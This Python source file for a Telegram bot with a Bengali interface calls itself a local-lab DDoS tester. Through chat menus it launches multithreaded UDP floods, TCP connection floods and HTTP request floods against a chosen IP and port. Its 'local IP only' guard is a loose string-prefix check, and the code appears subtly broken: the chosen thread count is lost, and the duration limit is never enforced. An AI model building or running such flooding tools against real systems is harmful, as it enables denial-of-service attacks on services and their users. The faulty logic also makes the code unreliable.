import logging
import os
import json
import socket
import threading
import time
from pathlib import Path
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("❌ সেট করো: TELEGRAM_BOT_TOKEN")

LAB_MEMORY_FILE = "lab_tests.json"

class LabMemory:
    """ল্যাব টেস্ট মেমরি"""
    
    @staticmethod
    def load():
        if Path(LAB_MEMORY_FILE).exists():
            with open(LAB_MEMORY_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        return {}
    
    @staticmethod
    def save(data):
        with open(LAB_MEMORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    
    @staticmethod
    def get_test(user_id):
        memory = LabMemory.load()
        return memory.get(str(user_id), {
            "target_ip": None,
            "target_port": 80,
            "test_active": False,
            "test_type": None,
            "packet_count": 0,
            "start_time": None
        })
    
    @staticmethod
    def update_test(user_id, data):
        memory = LabMemory.load()
        memory[str(user_id)] = data
        LabMemory.save(memory)

class LabTester:
    """লোকাল ল্যাব পেনটেস্টার"""
    
    def __init__(self):
        self.active_tests = {}
        self.lock = threading.Lock()
    
    def validate_local_ip(self, ip):
        """শুধু লোকাল IP গ্রহণ করো"""
        local_ranges = [
            '192.168.',
            '10.',
            '172.16.',
            '127.',
            'localhost'
        ]
        return any(ip.startswith(r) for r in local_ranges)
    
    def udp_worker(self, user_id, target_ip, target_port):
        """UDP টেস্ট ওয়ার্কার"""
        payload = b"LAB_TEST_PAYLOAD" * 50
        test_data = self.active_tests.get(user_id, {})
        
        while test_data.get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (target_ip, target_port))
                sock.close()
                
                with self.lock:
                    if user_id in self.active_tests:
                        self.active_tests[user_id]['packets'] += 1
            except:
                pass
    
    def tcp_worker(self, user_id, target_ip, target_port):
        """TCP টেস্ট ওয়ার্কার"""
        test_data = self.active_tests.get(user_id, {})
        
        while test_data.get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                sock.connect_ex((target_ip, target_port))
                sock.close()
                
                with self.lock:
                    if user_id in self.active_tests:
                        self.active_tests[user_id]['packets'] += 1
            except:
                pass
    
    def http_worker(self, user_id, target_ip, target_port):
        """HTTP রিকোয়েস্ট ওয়ার্কার"""
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_ip}:{target_port}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        
        test_data = self.active_tests.get(user_id, {})
        
        while test_data.get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((target_ip, target_port))
                sock.sendall(request)
                sock.close()
                
                with self.lock:
                    if user_id in self.active_tests:
                        self.active_tests[user_id]['packets'] += 1
            except:
                pass
    
    def start_test(self, user_id, target_ip, target_port, test_type, threads, duration):
        """টেস্ট শুরু করো"""
        
        # লোকাল IP চেক করো
        if not self.validate_local_ip(target_ip):
            return False, "❌ শুধুমাত্র লোকাল IP (192.168.x.x, 10.x.x.x, 127.x.x.x)\n\n⚠️ বাইরের ইনফ্রাস্ট্রাকচারে টেস্ট করা যায় না।"
        
        with self.lock:
            self.active_tests[user_id] = {
                'target_ip': target_ip,
                'target_port': target_port,
                'type': test_type,
                'active': True,
                'packets': 0,
                'start_time': time.time(),
                'duration': duration,
                'threads': threads
            }
        
        worker_map = {
            'udp': self.udp_worker,
            'tcp': self.tcp_worker,
            'http': self.http_worker
        }
        
        worker = worker_map.get(test_type, self.udp_worker)
        
        # থ্রেড শুরু করো
        for i in range(threads):
            t = threading.Thread(
                target=worker,
                args=(user_id, target_ip, target_port),
                daemon=True
            )
            t.start()
        
        return True, f"🧪 ল্যাব টেস্ট শুরু\n\n📍 টার্গেট: {target_ip}:{target_port}\n⚔️ টাইপ: {test_type}\n🧵 থ্রেড: {threads}\n⏱️ সময়: {duration}s"
    
    def stop_test(self, user_id):
        """টেস্ট থামাও"""
        with self.lock:
            if user_id in self.active_tests:
                test = self.active_tests[user_id]
                test['active'] = False
                packets = test['packets']
                duration = int(time.time() - test['start_time'])
                pps = packets / max(duration, 1)
                
                del self.active_tests[user_id]
                return True, packets, duration, int(pps)
        
        return False, 0, 0, 0
    
    def get_status(self, user_id):
        """টেস্ট স্ট্যাটাস পাও"""
        if user_id in self.active_tests:
            test = self.active_tests[user_id]
            elapsed = int(time.time() - test['start_time'])
            pps = test['packets'] / max(elapsed, 1)
            
            return {
                'active': True,
                'target': test['target_ip'],
                'port': test['target_port'],
                'type': test['type'],
                'packets': test['packets'],
                'elapsed': elapsed,
                'pps': int(pps),
                'threads': test['threads']
            }
        
        return {'active': False}

lab_tester = LabTester()

# টেলিগ্রাম হ্যান্ডলার

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """শুরু করো"""
    keyboard = [
        [
            InlineKeyboardButton("🧪 নতুন টেস্ট", callback_data="new_test"),
            InlineKeyboardButton("📊 স্ট্যাটাস", callback_data="status"),
        ],
        [
            InlineKeyboardButton("🛑 থামাও", callback_data="stop_test"),
            InlineKeyboardButton("❓ সাহায্য", callback_data="help"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🧪 **লোকাল ল্যাব DDoS টেস্টার**\n\n"
        "আপনার নিজের ল্যাব সার্ভারে পেনটেস্টিং করুন:\n\n"
        "✅ শুধুমাত্র লোকাল নেটওয়ার্ক (192.168.x.x, 10.x.x.x)\n"
        "✅ আপনার নিজের ডিভাইস/VM\n"
        "✅ সিকিউরিটি টেস্টিং এবং শেখার জন্য\n\n"
        "⚠️ বাইরের ইনফ্রাস্ট্রাকচারে ব্যবহার করা যায় না।",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """সাহায্য"""
    await update.message.reply_text(
        "**টেস্ট টাইপ:**\n"
        "• `udp` - UDP ফ্লুড\n"
        "• `tcp` - TCP সংযোগ\n"
        "• `http` - HTTP রিকোয়েস্ট\n\n"
        "**লোকাল IP রেঞ্জ:**\n"
        "`192.168.x.x` - সবচেয়ে কমন\n"
        "`10.x.x.x` - বড় নেটওয়ার্ক\n"
        "`172.16.x.x` - প্রাইভেট রেঞ্জ\n\n"
        "**উদাহরণ টার্গেট:**\n"
        "`192.168.1.100` - লোকাল মেশিন\n"
        "`192.168.1.100:8080` - কাস্টম পোর্ট",
        parse_mode="Markdown"
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """বাটন ক্লিক"""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "new_test":
        await query.edit_message_text(
            "🎯 লোকাল IP এড্রেস দাও:\n\n"
            "উদাহরণ:\n"
            "`192.168.1.100`\n"
            "`192.168.1.100:8080`\n"
            "`10.0.0.50:3000`"
        )
        context.user_data['waiting_for_ip'] = True
    
    elif query.data == "status":
        status = lab_tester.get_status(user_id)
        if status['active']:
            msg = (
                f"🧪 **লাইভ টেস্ট**\n\n"
                f"📍 টার্গেট: {status['target']}:{status['port']}\n"
                f"⚔️ টাইপ: {status['type']}\n"
                f"📊 প্যাকেট: {status['packets']}\n"
                f"⏱️ সময়: {status['elapsed']}s\n"
                f"💨 PPS: {status['pps']}\n"
                f"🧵 থ্রেড: {status['threads']}"
            )
        else:
            await query.edit_message_text("❌ কোনো টেস্ট চলছে না")
            return
        await query.edit_message_text(msg, parse_mode="Markdown")
    
    elif query.data == "stop_test":
        success, packets, duration, pps = lab_tester.stop_test(user_id)
        if success:
            await query.edit_message_text(
                f"🛑 **টেস্ট থামানো হয়েছে**\n\n"
                f"📊 প্যাকেট: {packets}\n"
                f"⏱️ সময়: {duration}s\n"
                f"💨 PPS: {pps}"
            )
        else:
            await query.edit_message_text("❌ কোনো টেস্ট চলছে না")
    
    elif query.data == "help":
        await query.edit_message_text(
            "**কমান্ড:**\n"
            "/start - মেনু\n"
            "/stop - থামাও\n"
            "/status - স্ট্যাটাস\n\n"
            "⚠️ **শুধুমাত্র লোকাল নেটওয়ার্ক**\n"
            "বাইরের IP ব্লক করা হয়েছে।",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """টেক্সট মেসেজ"""
    user_id = update.message.from_user.id
    text = update.message.text.strip()
    
    if context.user_data.get('waiting_for_ip'):
        # IP পার্স করো
        if ':' in text:
            ip_part, port_str = text.rsplit(':', 1)
            try:
                port = int(port_str)
            except:
                await update.message.reply_text("❌ পোর্ট সংখ্যা হতে হবে")
                return
        else:
            ip_part = text
            port = 80
        
        context.user_data['target_ip'] = ip_part
        context.user_data['target_port'] = port
        context.user_data['waiting_for_ip'] = False
        context.user_data['waiting_for_type'] = True
        
        await update.message.reply_text(
            f"✅ টার্গেট: `{ip_part}:{port}`\n\n"
            "টেস্ট টাইপ বেছে নাও:\n"
            "`udp` - UDP ফ্লুড\n"
            "`tcp` - TCP কানেকশন\n"
            "`http` - HTTP রিকোয়েস্ট",
            parse_mode="Markdown"
        )
    
    elif context.user_data.get('waiting_for_type'):
        test_type = text.lower()
        if test_type not in ['udp', 'tcp', 'http']:
            await update.message.reply_text("❌ ব্যবহার করো: udp | tcp | http")
            return
        
        context.user_data['type'] = test_type
        context.user_data['waiting_for_type'] = False
        context.user_data['waiting_for_threads'] = True
        
        await update.message.reply_text(
            f"✅ টাইপ: `{test_type}`\n\n"
            "থ্রেড সংখ্যা? (50-500, ডিফল্ট: 100)\n"
            "সংখ্যা দাও বা 'go' লিখো",
            parse_mode="Markdown"
        )
    
    elif context.user_data.get('waiting_for_threads'):
        threads = 100
        if text.lower() != 'go':
            try:
                threads = int(text)
                if threads < 50 or threads > 500:
                    await update.message.reply_text("❌ 50-500 এর মধ্যে")
                    return
            except:
                await update.message.reply_text("❌ সংখ্যা দাও")
                return
        
        context.user_data['waiting_for_threads'] = False
        context.user_data['waiting_for_duration'] = True
        
        await update.message.reply_text(
            f"✅ থ্রেড: {threads}\n\n"
            "টেস্ট সময়? (সেকেন্ড, ডিফল্ট: 30)\n"
            "সংখ্যা দাও বা 'go' লিখো",
            parse_mode="Markdown"
        )
    
    elif context.user_data.get('waiting_for_duration'):
        duration = 30
        if text.lower() != 'go':
            try:
                duration = int(text)
                if duration < 5 or duration > 300:
                    await update.message.reply_text("❌ 5-300 সেকেন্ড")
                    return
            except:
                await update.message.reply_text("❌ সংখ্যা দাও")
                return
        
        context.user_data['waiting_for_duration'] = False
        
        target_ip = context.user_data['target_ip']
        target_port = context.user_data['target_port']
        test_type = context.user_data['type']
        threads = int(context.user_data.get('waiting_for_threads', 100)) or 100
        
        # ফিক্স: threads ভ্যালু পান
        for key in context.user_data:
            if 'threads' in str(key):
                try:
                    threads = int(context.user_data[key])
                    break
                except:
                    pass
        
        success, msg = lab_tester.start_test(
            user_id, target_ip, target_port, test_type, threads, duration
        )
        
        if success:
            await update.message.reply_text(msg)
        else:
            await update.message.reply_text(msg)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """থামাও"""
    user_id = update.message.from_user.id
    success, packets, duration, pps = lab_tester.stop_test(user_id)
    
    if success:
        await update.message.reply_text(
            f"🛑 **টেস্ট থামানো হয়েছে**\n\n"
            f"📊 প্যাকেট: {packets}\n"
            f"⏱️ সময়: {duration}s\n"
            f"💨 গড় PPS: {pps}"
        )
    else:
        await update.message.reply_text("❌ কোনো টেস্ট চলছে না")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """স্ট্যাটাস"""
    user_id = update.message.from_user.id
    status = lab_tester.get_status(user_id)
    
    if status['active']:
        await update.message.reply_text(
            f"🧪 **লাইভ টেস্ট**\n\n"
            f"📍 টার্গেট: {status['target']}:{status['port']}\n"
            f"⚔️ টাইপ: {status['type']}\n"
            f"📊 প্যাকেট: {status['packets']}\n"
            f"⏱️ সময়: {status['elapsed']}s\n"
            f"💨 PPS: {status['pps']}\n"
            f"🧵 থ্রেড: {status['threads']}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("❌ কোনো টেস্ট চলছে না")

def main():
    """মেইন"""
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logger.info("🧪 ল্যাব টেস্টার বট শুরু হয়েছে")
    
    app.run_polling(
        poll_interval=3.0,
        timeout=60,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("বন্ধ হয়েছে")
    except Exception as e:
        logger.error(f"Error: {e}")
        raise